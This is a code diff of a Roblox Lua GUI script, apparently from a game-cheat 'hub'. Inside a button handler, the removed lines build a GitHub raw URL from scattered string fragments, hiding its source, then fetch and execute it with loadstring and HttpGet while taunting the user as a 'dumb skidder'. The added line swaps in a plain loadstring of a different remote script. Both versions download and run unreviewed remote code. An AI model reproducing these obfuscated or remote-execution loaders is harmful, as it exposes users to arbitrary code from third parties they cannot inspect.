@@ -93,22 +93,5 @@ button.MouseButton1Click:Connect(function()
 	mainFrame:Destroy() -- Destroi a janela principal imediatamente
 	wait(1)             -- Espera 1 segundo antes da execução do código
 
-	if "you are a dumb skidder" then
-		local dumb = "pao.de.queijo/"
-		local r = ".com/"
-		local j = "ny4theru2ne"
-		local ee = "/placer"
-		local skidder = "refs/heads/"
-		local q = "usercontent"
-		local x = "lixo" -- FAZ O L
-		local erreifuimlk = "main/"
-		local SUKUNA = "wx-sources/"
-		local you = "head/content" -- Fazu l
-		local p = "https://raw.github"
-
-		local w, g, f = task.wait, game, loadstring
-		local url = p .. q .. r .. SUKUNA .. dumb .. skidder .. erreifuimlk .. j
-		f(g:HttpGet(url))()
-		return ("Yes, you are a dumb skidder." or "sla")
-	end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/DezomXHub/DemozX/main/DemoZXHub.txt"))()
 end)
